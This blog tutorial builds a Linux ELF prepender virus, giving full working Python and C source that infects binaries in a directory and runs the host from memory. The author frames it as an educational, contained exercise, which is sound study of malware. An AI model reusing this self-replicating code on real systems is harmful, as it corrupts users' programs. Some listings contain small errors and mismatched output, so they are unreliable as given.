+++
title = "Going Viral, or an Infectious ELF 🧝"
author = ["Frederic Linn"]
date = 2022-02-01T09:54:00+01:00
draft = false
+++

<div class="verse">

Roses are red,<br />
&nbsp;Violets are blue,<br />
Sugar is sweet,<br />
&nbsp;And viruses are cool.<br />
--- Nursery Rhyme<br />

</div>

Current events _yada yada_. We're going to write a virus today!

In hindsight it's obvious that our [previous](/blog/modifying-binaries-part-1) [adventures](/blog/modifying-binaries-part-2) led to the magical realm of malware. What other group of software needs to hide in the trenches of an operating system (or even [lower](https://www.youtube.com/watch?v=q2KUufrjoRo)), always trying to evade detection. In order to succeed, malware authors need to be well aware of all the low-level details of their target environment. This includes but is not limited to ways of hooking into important functionality, injecting into running processes and being able to hide code inside files because of the way certain formats work.

What better way to learn about those details than to write a tiny piece of malware ourselves? It's not going to be very practical, but rather educational. We're not in for the money. It's just going to be another step in our journey of learning binary stuff on `Linux`. As usual we'll deal with `ELF` files of the 64-bit variety, but that's not at all important for the method of infection we're showing off today.

As already mentioned, we're going to write a small virus that infects `ELF` files by prepending itself to those host binaries. There's a long history of these types of viruses and I think it makes for a great starting point into the subject matter. I hope you enjoy.


### What's a Prepender? {#what-s-a-prepender}

The infection method presented in this article is the simplest one imaginable. Yet, we're still going over the concept with a manual example, just to be able to visualize it better.

Our starting point are two programs. A host...

```C { linenos=true, linenostart=1 }
/* host.c */
#include <stdio.h>

int main() {
    printf("Hello, World!");
    return 0;
}
```

... and a virus.

```C { linenos=true, linenostart=1 }
/* vx.c */
#include <stdio.h>

int main() {
    printf("Miley Virus!");
    return 0;
}
```

Let's compile them.

```txt { linenos=true, linenostart=1 }
$ gcc -Wall -Wextra -Werror -O2 -std=c99 -pedantic vx.c -o vx
$ gcc -Wall -Wextra -Werror -O2 -std=c99 -pedantic host.c -o host

$ file host
host: ELF 64-bit LSB pie executable, [---snip---]

$ file vx
vx: ELF 64-bit LSB pie executable, [---snip---]
```

As expected, we get two ELF binaries. Let's quickly search for the ELF magic number.

```txt { linenos=true, linenostart=1, hl_lines=["2","5"] }
$ xxd host | grep "7f45 4c46"
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............

$ xxd vx | grep "7f45 4c46"
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
```

Now we're going to do what viruses do best: Infecting stuff. Let's prepend the virus binary to the host binary. We do it the other way round, though, by _appending_ the raw host bytes to the virus.

```txt { linenos=true, linenostart=1, hl_lines=["4","5","8"] }
$ cat host >> vx

$ xxd vx | grep "7f45 4c46"
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00003ed0: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............

$ ./vx
Miley Virus!
```

Alright, we've got two for one! Running the binary will now simply run the virus code and exit. We note that two concatenated ELF files function as expected. The first one gets run while the second one is still present.

Let's manually "extract" our host code from the binary. We saw the offset of the second ELF header in the `xxd` output:

```txt { linenos=true, linenostart=1 }
$ python -c "print(int(0x3ed0))"
16080
```

Okay, our host code apparently starts at offset `16080` decimal. Armed with this knowledge, we can use `dd` to carve out our host file:

```txt { linenos=true, linenostart=1, hl_lines=["1","7"] }
$ dd if=vx of=host_carved skip=16080 count=32160 bs=1
16080+0 records in
16080+0 records out
16080 bytes (16 kB, 16 KiB) copied, 0,0533195 s, 302 kB/s

$ ./host_carved
Hello world!
```

That worked!
As we can see, it's important to know the exact size of the (compiled) virus. Something to keep in mind for later.


### Be Prepared, Not Scared {#be-prepared-not-scared}

That's enough manual labor for a whole week! A computer should have done that. But how does the _actual_ virus behave. Here's some pseudocode:

```text { linenos=true, linenostart=1 }
for every entry in a folder:
    if entry is a valid ELF file:
        if ELF file is not already infected:
            infect ELF file
        if currently executing ELF file is not original virus:
            run the host code
            run the payload
```

There are more nuances than are shown here, but this should suffice for now.

We have a rough road map, so let's think about our language of choice.
Scary viruses are written in `Assembly` or `C`, right? Yeah well, those languages are even _more_ scary than the viruses themselves!

So what are our options? Looking at it, that pseudocode is _almost_ a valid `Python` program. Almost. Let's just stick with that lovely language for now. Malware written in it seems to be [on the rise](https://www.cyborgsecurity.com/cyborg_labs/python-malware-on-the-rise/) anyway. We're all about that cutting-edgyness here!

Without further ado, I proudly present to you **Linux.DoomsdayPreppers**[^fn:1]:

```python { linenos=true, linenostart=1, hl_lines=["7"] }
# doomsday_preppers.py
import os
import sys

QUARANTINE_WARD = "/home/frederic/git/vx/the_zoo"
ELF_MAGIC = b'\x7fELF'
DARK_MARK  = b'GEBIRGE'
VIRUS_SIZE = 800736

def is_elf(content):
    return content[:4] == ELF_MAGIC

def is_infected(content):
    return content.find(DARK_MARK) >= 0
```

We start by defining some constants. First off, we _definitely_ want to put our virus under quarantine. The `DARK_MARK` in line **7** is a new concept. It's going to help us identify already infected files.
Lastly, we have our hardcoded `VIRUS_SIZE`. We'll talk about it in a minute.

The two functions `is_elf()` and `is_infected()` use the constants to check for the `ELF` magic and the infection mark respectively.

Next up is our infection routine:

```python { linenos=true, linenostart=15, hl_lines=["8"] }
def infect(path):
    print("[+] About to infect", path)
    with open(path, "rb") as host:
        host_data = host.read()
    with open(sys.argv[0], "rb") as virus
        virus_data = virus.read(VIRUS_SIZE)
    with open(path, "wb") as infected:
        infected.write(virus_data + host_data)
```

We cut the virus bytes from the currently executing binary[^fn:2] (which could be the virus itself or an already infected binary), prepend them to the _not yet infected_ file's bytes and overwrite the file (identified by its `path`) with the whole thing in line **22**.

The next function has a little bit of fancyness going on. In order to appreciate it, allow me to make a quick detour:

There are a couple of ways to run the host binary on `Linux`. We could create a temporary file, write the host bytes into it and execute it via one of the `exec()` functions. This approach works, but it's just not _fancy_ enough. While researching, I got the feeling that "dropping a file" is frowned upon. Because we too want to be cool kids, there has to be another way.

Well, of course there is with over 300 system calls! One of those is `memfd_create()`. Let's have a look at its [description](https://man7.org/linux/man-pages/man2/memfd_create.2.html):

> memfd_create() creates an anonymous file and returns a file descriptor that refers to it.
> The file behaves like a regular file, and so can be modified, truncated, memory-mapped, and so on.
> However, unlike a regular file, it lives in RAM and has a volatile backing storage.
> Once all references to the file are dropped, it is automatically released.
> Anonymous memory is used for all backing pages of the file.

Look at us hot shot virus authors. Being really stealthy and all that! Obviously I jest[^fn:3], I have no clue about intrusion detection systems and such. But that's besides the point, because this right here is merely about discovering and trying new things.

But wait a second, we're getting ahead of ourselves. Are we even able to try it? We're writing `Python`, after all. It _does_ have the wonderful `os` [module](https://docs.python.org/3/library/os.html). But does said module have a wrapper around `memfd_create()`?

You know, that's what they call a trick question. `Python`, of course, has _everything_. Don't you ever doubt it again!

```python { linenos=true, linenostart=23, hl_lines=["3","8","10"] }
def run_host():
    print("[+] Creating in-memory file")
    fd = os.memfd_create("doomsday_preppers")
    print("[+] File descriptor with number ", fd)
    with open(sys.argv[0], "rb") as everything:
        host_data = everything.read()[VIRUS_SIZE:]
    with open(fd, "wb") as mem_host:
        mem_host.write(host_data)
        print("[+] Executing host from memory")
        os.execve(fd, sys.argv, {})

def payload():
    print("[+] Executing payload")
    print("Attention, toilet paper tussle in progress!")
```

So back to our code: In line **25** we ask the `memfd_create()` wrapper for a file descriptor, use it to write the host code into the in-memory file in line **30** and execute said file with `os.execve()`[^fn:4] in line **32**.

Who says systems programming is hard? We're doing it with our comfy `Pythonz`...

The payload could be anything, but ours brings to attention the modern comforts of _toilet paper_ in these infectious times. Why not start mining crypto currency on those poor victim machines? Because we're altruistic virus writers, that's why!

Lastly we have our main loop that ties everything neatly together:

```python { linenos=true, linenostart=37, hl_lines=["23"] }
def main():
    # Get the name of the current executable.
    myself = os.path.basename(sys.argv[0])

    # Look for non-infected ELF files in the directory.
    # Skip directories and ourselves.
    # If a candidate is found, infect it.
    with os.scandir(QUARANTINE_WARD) as entries:
        for entry in entries:
            if (not entry.is_file()):
                continue
            if (entry.name == myself):
                continue

            with open(entry, "rb") as f:
                content = f.read()
                if (is_elf(content)):
                    if (not is_infected(content)):
                        infect(entry.path)

    # Check if this code is already attached to a host.
    file_size = os.path.getsize(sys.argv[0])
    if (file_size > VIRUS_SIZE):
        payload()
        run_host()

if __name__ == "__main__":
    main()
```

We iterate over every entry in our quarantine directory, skipping over other directories (because, again, we're _polite_ virus writers!) and the executing binary itself. A suitable file is identified via the `ELF_MAGIC` bytes.

In order to not infect a file _again_, we check for the presence of the `DARK_MARK` via `is_infected()`. We don't have to specifically write the mark to every infected binary, because it's already statically present in the virus by merely defining it.

If a file is not yet infected, we... you guessed it.
After we're done infecting all the possible files, we want to actually run the host code so that it looks like every infected program gets executed normally. Our simple check in line **59** prevents us from trying to execute non-existing host code in the _original_ virus binary.

Are we done? The attentive reader might have noticed a fatal flaw&nbsp;[^fn:5]: All we've talked about so far are `ELF` files. But we've got a `Python` _script_ at hand. That's not working, ain't it?[^fn:6]


#### Creating a binary from a Python script {#creating-a-binary-from-a-python-script}

Luckily there are a few options for "compiling" our script, each with their own considerations and tradeoffs. At first, I wanted to give a quick overview over the landscape of helpful tools, but that topic has no business of taking up much space in this article. Oh dear, taking up _very much_ space it certainly would!

That's why we keep it brief:

There are three main tools for converting a `Python` script into an executable:

-   `PyInstaller`
-   `PyOxidizer`
-   `Nuitka` (which I went with for no particular reason)

Let's create a simple executable:

```txt { linenos=true, linenostart=1 }
$ echo 'print("Hello from Python!")' > hello.py
$ cat hello.py
print("Hello from Python!")
$ nuitka3 hello.py
----snip----
Nuitka:INFO: Successfully created 'hello.bin'.
$ ./hello.bin
Hello from Python!
```

That works! But what kind of file is it?

```txt { linenos=true, linenostart=1, hl_lines=["2","8","15"] }
$ file hello.bin
hello.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked [----snip----]

$ ldd hello.bin
        linux-vdso.so.1 (0x00007ffe87df5000)
        libdl.so.2 => /usr/lib/libdl.so.2 (0x00007fdf49364000)
        libm.so.6 => /usr/lib/libm.so.6 (0x00007fdf49220000)
        libpython3.10.so.1.0 => /usr/lib/libpython3.10.so.1.0 (0x00007fdf48e79000)
        libc.so.6 => /usr/lib/libc.so.6 (0x00007fdf48cad000)
        /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fdf49430000)
        libpthread.so.0 => /usr/lib/libpthread.so.0 (0x00007fdf48c8c000)
        libutil.so.1 => /usr/lib/libutil.so.1 (0x00007fdf48c87000)

$ wc -c < hello.bin
755648
```

By default `Nuitka` creates a dynamically linked `ELF` file. If we check all the required shared libraries with `ldd`, we see that it depends on a _specific_ version of `libpython`. Good luck getting a widespread infection with this virus!

What's that? Create a statically linked binary, you say? That's a fantastic idea, which will result in a binary that's between 20 and 30 **MB** large! Our dynamically linked one is large enough as is (line **15** shows the byte count).

So while I would consider a static `Python` binary for a Post-Exploitation-Framework, because of the sheer comfort of writing it, there's something distasteful about doing our little experiments with so much _stuff_ attached. We're still going to test our dynamically linked version, but the virus is called Doomsday **Preppers** for a reason!


#### First outbreak {#first-outbreak}

Now that we have a way of compiling our script, let's just do that and start a controlled outbreak:

```txt { linenos=true, linenostart=1, hl_lines=["16","17","26","27"] }
$ nuitka3 ../manual_prepend/doomsday_preppers.py
----snip----
Nuitka:INFO: Successfully created 'doomsday_preppers.bin'.
$ rm -rf doomsday_preppers.build/

$ ls -sh1
total 784K
784K doomsday_preppers.bin

$ cp /bin/echo .
$ cp /bin/ls .

$ ls -sh1
total 972K
784K doomsday_preppers.bin
 44K echo
144K ls

$ ./doomsday_preppers.bin
[+] About to infect /home/frederic/git/vx/the_zoo/echo
[+] About to infect /home/frederic/git/vx/the_zoo/ls

$ ls -sh1
total 2,5M
784K doomsday_preppers.bin
828K echo
928K ls
```

After compiling our virus, we copy some system binaries (namely `ls` and `echo`) into our quarantine directory. We can see just how small those programs are in lines **16** and **17**.

Running our virus binary conveniently gives us feedback about what happened. I wish every virus writer was as polite as we are!
According to the output of our virus, everything should have gone as expected. And indeed, checking the file sizes in lines **26** and **27**, they've grown quite a bit.

Our infection routine seems to be working if we run the original virus, but what about running an infected binary. Will it infect other binaries and execute the host code?

```txt { linenos=true, linenostart=1, hl_lines=["7"] }
$ ./ls
[+] Executing payload
Attention, toilet paper tussle in progress!
[+] Creating in-memory file
[+] File descriptor with number  3
[+] Executing host from memory
doomsday_preppers.bin  echo  ls
```

Running the infected `ls` produces the payload's output _and_ the correct `ls` output (line **7**). That's so cool, the whole executing the host from memory via `memfd_create()` does work!

For our last test, we copy a fresh binary into our little zoo:

```txt { linenos=true, linenostart=1 }
$ cp /bin/ps .
$ ls -sh1
total 2,7M
784K doomsday_preppers.bin
828K echo
928K ls
136K ps

$ ./ls
[+] About to infect /home/frederic/git/vx/the_zoo/ps
[+] Executing payload
Attention, toilet paper tussle in progress!
[+] Creating in-memory file
[+] File descriptor with number  3
[+] Executing host from memory
doomsday_preppers.bin  echo  ls  ps

$ ./ps
[+] Executing payload
Attention, toilet paper tussle in progress!
[+] Creating in-memory file
[+] File descriptor with number  3
[+] Executing host from memory
    PID TTY          TIME CMD
 517310 pts/5    00:00:03 fish
 523705 pts/5    00:00:00 3
```

Running the infected `ls` again does indeed infect the fresh copy of `ps`, in addition to running the payload and the host code.

We did it! Our very first, very own, very useless virus. The year of our Lord 2022 will be the year of the virus! Wait...


### Linux.Doomsday {#linux-dot-doomsday}

Now that we're done with our first little virus, I'm letting you in on a secret. This right here is not purely educational. It's also a vanity project! I have to _at least_ go down to ~~sea~~ `C` level in this article. I want the scene to put some **respeck** on my name[^fn:7]!

Because we're not drastically altering the structure of our virus, I think it's safe to take in all the sights at once:

```C { linenos=true, linenostart=1 }
#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <libelf.h>

#define VIRUS_SIZE 815986

static unsigned short DARK_MARK = 666;
static char QUARANTINE_WARD[] = "/home/frederic/git/vx/the_zoo";

/*
 * Read the last sizeof(DARK_MARK) bytes of a
 * given file to check if it's already infected.
 */
bool
is_infected(int fd, long file_size)
{
	unsigned short mark;
	int offset;

	offset = file_size - sizeof(DARK_MARK);

	lseek(fd, offset, SEEK_SET);
	read(fd, &mark, sizeof(DARK_MARK));
	lseek(fd, 0, SEEK_SET);

	return mark == DARK_MARK;
}

/*
 * Create an in-memory file via memfd_create().
 * First write the virus part of *this* binary,
 * then the whole *other* binary and lastly the mark to it.
 * Replace the other binary by simply overwriting it
 * with the contents of our temporary file.
 */
void
infect(int myself_fd, int fd, long file_size)
{
	int tmp_fd;
	long final_size;

	tmp_fd = memfd_create("tmp", MFD_CLOEXEC);
	final_size = VIRUS_SIZE + file_size + sizeof(DARK_MARK);

	sendfile(tmp_fd, myself_fd, NULL, VIRUS_SIZE);
	sendfile(tmp_fd, fd, NULL, file_size);
	write(tmp_fd, &DARK_MARK, sizeof(DARK_MARK));

	lseek(myself_fd, 0, SEEK_SET);
	lseek(fd, 0, SEEK_SET);
	lseek(tmp_fd, 0, SEEK_SET);

	sendfile(fd, tmp_fd, NULL, final_size);
	close(tmp_fd);
}

/*
 * Run the host code by writing it into an in-memory file
 * provided by memfd_create(), which gives us a file descriptor
 * that can be used in conjunction with fexecve().
 *
 * We fork here so that the payload can be executed afterwards by
 * the parent process. It's not needed, though.
 */
void
run_host(int myself_fd, long myself_size, char *argv[])
{
	int host_fd;
	long virus_size = VIRUS_SIZE;
	long host_size;

	host_size = myself_size - VIRUS_SIZE;

	host_fd = memfd_create(argv[0], MFD_CLOEXEC);
	sendfile(host_fd, myself_fd, &virus_size, host_size - sizeof(DARK_MARK));

	pid_t child = fork();
	if (child == 0) {
		const char * const envp[] = {NULL};
		fexecve(host_fd, argv, (char * const *) envp);
	} else {
		waitpid(child, NULL, 0);
	}
}

/*
 * Print witty things.
 */
void
payload()
{
	printf("Attention, toilet paper tussle in progress!");
}

/*
 * Iterate over every entry in a given (quarantine) folder.
 * In case of a non-infected ELF file, infect and mark it.
 * The payload gets triggered and the host gets executed from memory if
 * this code is already attached to an infected binary.
 */
int
main(int argc, char* argv[])
{
	/* Get rid of the "unused variable" warning. */
	(void)argc;

	int elf_fd;
	int myself_fd;

	Elf *elf;
	DIR *dir;
	struct dirent *entry;
	struct stat myself_stat;
	struct stat elf_stat;

	/* Initialize libelf. */
	elf_version(EV_CURRENT);

	myself_fd = open(argv[0], O_RDONLY);
	fstat(myself_fd, &myself_stat);
	dir = opendir(QUARANTINE_WARD);

	while ((entry = readdir(dir)) != NULL) {
		/* Exclude directories. */
		if (entry->d_type == DT_DIR) continue;
		/* Exclude myself. */
		if (myself_stat.st_ino == entry->d_ino) continue;

		elf_fd = open(entry->d_name, O_RDWR);
		elf = elf_begin(elf_fd, ELF_C_READ, NULL);

		/* Only include ELF files. */
		if (!(elf_kind(elf) == ELF_K_ELF)) continue;

		fstat(elf_fd, &elf_stat);

		if (!is_infected(elf_fd, elf_stat.st_size)) {
			infect(myself_fd, elf_fd, elf_stat.st_size);
		}

		close(elf_fd);
		elf_end(elf);
	}
	closedir(dir);

	/* Only run host code and payload if this is not the original virus. */
	if (myself_stat.st_size > VIRUS_SIZE + (int) DARK_MARK) {
		run_host(myself_fd, myself_stat.st_size, argv);
		payload();
	}

	close(myself_fd);
	return 0;
}
```

Now we're talking! There are a couple of things to note, though. First off, I have no idea what I'm doing with regards to `C`[^fn:8]! Again, the error handling is missing intentionally for brevity. But how should a _virus_ handle errors, anyway?
Probably be as quiet as possible about it.

Another difference is the way we detect infected files. The `Python` one-liner for finding our static `DARK_MARK` was super convenient. Doing a `C` version of this would be _quite a few_ one-liners. Instead we're simply appending the `DARK_MARK` manually to every binary that gets infected. This way we only have to check the last `sizeof(DARK_MARK)` bytes of every file to see if it's already infected. What's that? How do we mark the original virus binary? Well, that's a build step now! We'll have a look at it in a moment.

Next up is a system call that's super convenient: `sendfile()`. It copies data between two file descriptors _within the kernel_, which makes it more efficient because there's no need for temporary buffers in user space.

The last thing I want to highlight is the usage of `libelf.h`[^fn:9]. It's completely overkill for this virus, as we could have easily just checked the first four bytes of every file for the `ELF_MAGIC`. I still wanted to give the library a try, because more sophisticated infection mechanisms than _prepending_ rely on `ELF` internals, which in turn means we need a way of actually parsing those files in the future.

Finally let's have a look at our `Makefile`:

```makefile { linenos=true, linenostart=1 }
# Compile the virus, link against libelf.
# Afterwards append the dark mark to the final binary.
build:
	gcc -Wall -Wextra -pedantic -static doomsday.c -lelf -o ../../the_zoo/doomsday
	echo -n -e "\x9a\x02" >> ../../the_zoo/doomsday
```

The `-lelf` switch tells the compiler to link against `libelf`. As commented, the `echo` line appends the dark mark. We have to use the little endian representation of `666`:

```python { linenos=true, linenostart=1 }
# pack.py
import struct
# < : little endian byte order
# H : C Type unsigned short (2 bytes)
print(struct.pack("<H", 666))
```

```text
b'\x9a\x02'
```


### Conclusion {#conclusion}

And just like that, we're done. Let's recap what we did:

First we manually prepended a binary to another one. Executing this Frankenstein worked just fine. We then proceeded to write our first virus based on that concept. Doing it in `Python` gave us all the goodies of a high-level language. But because `Python` programs usually get _interpreted_, we needed another build step to compile our script into a native `ELF` binary. Those can get pretty chunky, however, especially when statically linked.

While certainly a great preparation, it didn't feel quite right. We're all about minimalism here and there's _nothing_ minimalist about a 30MB prepender virus!

The logical choice was to use `C`, which was a super fun exercise in reading up on system calls. We learned about manually seeking in files (`lseek()`), efficiently copying data between file descriptors (`sendfile()`) and creating ephemeral files in memory (`memfd_create()`).

Armed with all that knowledge, we actually succeeded in writing a simple prepender virus that doesn't drop any temporary files. Can I now buy some [merch](https://transi.store/products/vx-underground_hoodie) without feeling like an impostor?

As always, if you have any questions or suggestions: Feel free to [holla at me](/about). Thanks for reading!


### Resources and Acknowledgments {#resources-and-acknowledgments}

-   [Unix Viruses](https://www.win.tue.nl/~aeb/linux/hh/virus/unix-viruses.txt) by Silvio Cesare, _the_ early `ELF` virus bible! Our article touches upon approximately 5% of what he had to say ages ago.
-   [@guitmz's](https://www.guitmz.com/) website with many prepender examples in different languages. Thanks for the inspiration and the `memfd_create()` call!
-   [Himanshu Arora's](https://johnvidler.co.uk/linux-journal/LJ/213/11185.html) decade old article in the Linux Journal that describes the exact technique we're using.
-   [libelf by example](https://atakua.org/old-wp/wp-content/uploads/2015/03/libelf-by-example-20100112.pdf) by Joseph Koshy, which is  a great introduction.
-   [ELF-VIRUS](https://github.com/shailrshah/ELF-Virus/blob/master/src/virus.c) by Shail Shah for some `C` inspiration (mainly `sendfile()`).

[^fn:1]: A small nod to the wonderful [DJ Smokey](https://soundcloud.com/smoke-gang-beatz/corona-doomsday-preppers-w-dj-smokey-soudiere-dj-kraft-dinna).
[^fn:2]: That's precisely why we need to keep track of the `VIRUS_SIZE`.
[^fn:3]: 🎩
[^fn:4]: Which conveniently lets us [specify](https://docs.python.org/3/library/os.html#os.execve) a file descriptor instead of a path for the file to be executed since `Python 3.3`.
[^fn:5]: It's _not_ the lack of error handling. That's missing intentionally so that things stay readable.
[^fn:6]: That doesn't mean there are no viruses in script form. Have a look at this [talk](https://www.youtube.com/watch?v=2Ra1CCG8Guo) by Ben Dechrai.
[^fn:7]: <https://www.youtube.com/watch?v=4jLT7GQYNhI&t=90s>
[^fn:8]: I'm not being overmodest, I really have no clue.
[^fn:9]: You can find it [here](https://sourceforge.net/projects/elftoolchain/).
